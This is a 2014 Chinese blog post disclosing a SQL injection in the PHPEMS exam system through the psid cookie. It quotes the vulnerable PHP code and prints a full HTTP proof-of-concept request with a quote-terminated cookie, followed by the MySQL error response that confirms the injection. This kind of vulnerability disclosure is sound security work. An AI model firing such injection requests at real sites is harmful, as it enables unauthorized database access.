title: "phpems SQL注入(cookies)"
date: 2014-01-12 18:22:40
tags:
id: 478
comment: false
categories:
  - exploit
---

<pre class="brush:php">	public function __construct(&amp;$G)
    {
    	$this-&gt;G = $G;
    	if (ini_get('magic_quotes_gpc')) {
			$get    = $this-&gt;stripSlashes($_REQUEST);
			$post   = $this-&gt;stripSlashes($_POST);
			$this-&gt;cookie = $this-&gt;stripSlashes($_COOKIE);
		} else {
			$get    = $_REQUEST;
			$post   = $_POST;
			$this-&gt;cookie = $_COOKIE;
		}

		$this-&gt;file = $_FILES;
		$this-&gt;get = $this-&gt;initData($get);
		$this-&gt;post = $this-&gt;initData($post);
		$this-&gt;url = $this-&gt;parseUrl();

    }

..........
	//获取cookie
	public function getCookie($par,$nohead = 0)
    {
    	if(isset($this-&gt;cookie[CH.$par]))return $this-&gt;cookie[CH.$par];
    	elseif(isset($this-&gt;cookie[$par]) &amp;&amp; $nohead)return $this-&gt;cookie[$par];
    	else return false;
    }</pre>
如果用户开启了GPC，程序员还特意使用stripSlashes()给关掉。
<pre class="brush:php">    public function getSessionId()
    {
    	$sessionid = $this-&gt;ev-&gt;getCookie('psid');
    	if(!$sessionid)
    	{
    		if($this-&gt;ev-&gt;getCookie('PHPSESSID',1))
    		{
    			$this-&gt;ev-&gt;setCookie('psid',$this-&gt;ev-&gt;getCookie('PHPSESSID',1),3600*24);
    			$sessionid = $this-&gt;ev-&gt;getCookie('PHPSESSID',1);
    		}
    		else
    		{
    			$sid = md5($this-&gt;ev-&gt;getClientIp().'/'.$_SERVER['HTTP_X_FORWARDED_FOR'].'/'.$_SERVER['REMOTE_ADDR'].':'.$_SERVER['REMOTE_PORT'].':'.$_SERVER['HTTP_USER_AGENT'].':'.date('Y-m-d'));
    			$this-&gt;ev-&gt;setCookie('psid',$sid,3600*24);
    			$sessionid = $sid;
    		}
    		$data = array('session',array('sessionid'=&gt;$sessionid,'sessionuserid'=&gt;0,'sessionip'=&gt;$this-&gt;ev-&gt;getClientIp()));
    		$sql = $this-&gt;sql-&gt;makeReplace($data);
    		$this-&gt;db-&gt;exec($sql);
    	}
    	$this-&gt;sessionid = $sessionid;
    	return $this-&gt;sessionid;
    }</pre>
获得psid参数并起保存在$sessionid里
<pre class="brush:php">	//修改考试会话内容
	//参数：会话内容数组
	//返回值：true
	public function modifyExamSession($args)
	{
		$sessionid = $this-&gt;session-&gt;getSessionId();
		$data = array('examsession',$args,"examsessionid = '{$sessionid}'");
		$sql = $this-&gt;sql-&gt;makeUpdate($data);
		$this-&gt;db-&gt;exec($sql);
		return true;
	}</pre>
任意找了一个进入数据库的地方。

从上面过程看到，没有做任何过滤就进入数据库了。

&nbsp;
<pre class="brush:cpp">Request:
POST /pechina20131101/index.php?exam-app-basics-openit HTTP/1.1
Host: localhost
Proxy-Connection: keep-alive
Content-Length: 79
Origin: http://localhost
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept: */*
Referer: http://localhost/pechina20131101/index.php?exam-app-basics-detail&amp;basicid=4
Accept-Encoding: gzip,deflate,sdch
Accept-Language: zh-CN,zh;q=0.8
Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
Cookie: exam_psid=c6f1b7acd452e6d72a3ede0f501a9211'; exam_currentuser=%25B4%2585%258B%2585%25CE%25BE%258D%257C%2586%2585u%25BE%25B8%25BE%25C6%25B4%25C2%25B9%25C8%25BE%25B8%25BD%25BC%25AFu%2586%25C6%2585%2585%2585u%2581%258Bm%258E%25BE%258D%257C%2588%2585u%25BE%25B8%25BE%25C6%25B4%25C2%25B9%25C3%25AC%25C6%25BE%25CA%25BA%25C5%25AFu%2586%25C6%2585%2586%257D%258Dm%258C%2581%25B8%2582%258C%257D%2584%2583%258C%2581%2588%25B0%25B5%2582%2585%25AE%258C%257D%25B4%2580%2587%2584%25B7%25AF%2588%25AC%2586%257E%2583%257C%2584%257Du%2586%25C6%2585%258C%2585u%25BE%25B8%25BE%25C6%25B4%25C2%25B9%25BC%25BBu%2586%25C6%2585%258C%2585u%257C%2585%2582%2581%257B%2581%257B%2581%257Cu%2586%25C6%2585%2584%257F%258Dm%25C6%25B0%25C6%25BE%25BC%25BA%25C1%25B2%25C5%25BA%25C8%25BB%25BC%25AFu%2586%25C6%2585%2584%2585u%2583u%2586%25C6%2585%2584%2581%258Dm%25C6%25B0%25C6%25BE%25BC%25BA%25C1%25B7%25C2%25B2%25BC%25B9%25C7%25B4%25C0%25B0u%2586%25BC%2585%2584%257E%258B%2584%2588%257C%2589%2582%258B%257E%258E%25BE%258D%257C%2588%2585u%25BE%25B8%25BE%25C6%25B4%25C2%25B9%25C8%25BE%25B8%25BD%25C1%25AC%25C0%25B0u%2586%25C6%2585%2589%2585u%257C%2584%257C%2584%257C%2584m%258E%25BE%258D%257C%2589%2585u%25BE%25B8%25BE%25C6%25B4%25C2%25B9%25C7%25B4%25C0%25B0%25BF%25B4%25C0%25B4%25C7m%258E%25B4%258D%257C%2586%2583%258C%2580%2584%2581%258A%2583%2586%2586%25C6%2585%258C%2585u%25BE%25B8%25BE%25C6%25B4%25C2%25B9%25BC%25AFu%2586%25C6%2585%2586%257D%258Dm%25B6%2581%25B9%257C%25B5%2582%25B4%25AE%25B7%257F%2588%257D%25B8%2581%25B7%2582%2585%25AC%2586%25B0%25B7%25B0%2583%25B1%2588%257B%2584%25AC%258C%257D%2584%257Cu%2586%25D0; CNZZDATA5243664=cnzz_eid%3D2105242747-1389515449-%26ntime%3D1389515449%26cnzz_a%3D3%26sin%3Dnone%26ltime%3D1389515448225

Response:
HTTP/1.1 200 OK
Date: Sun, 12 Jan 2014 09:32:14 GMT
Server: Apache/2.4.7 (Win32) OpenSSL/0.9.8y PHP/5.4.22
X-Powered-By: PHP/5.4.22
P3P: CP=CAO PSA OUR
Content-Length: 606
Content-Type: text/html; charset=utf-8

ERRO:SELECT * FROM x2_session AS session WHERE sessionid = 'c6f1b7acd452e6d72a3ede0f501a9211'' LIMIT 0,100:You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''c6f1b7acd452e6d72a3ede0f501a9211'' LIMIT 0,100' at line 1ERRO:UPDATE x2_session AS session SET `sessionlasttime` = '1389519134' WHERE sessionid = 'c6f1b7acd452e6d72a3ede0f501a9211'':You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''c6f1b7acd452e6d72a3ede0f501a9211''' at line 1</pre>
漏洞证明。

&nbsp;

PS:很久没弄PHP的漏洞了，因为也只能找到这些简单的漏洞；又是一次练习同时也为了给明年的毕业设计收集素材。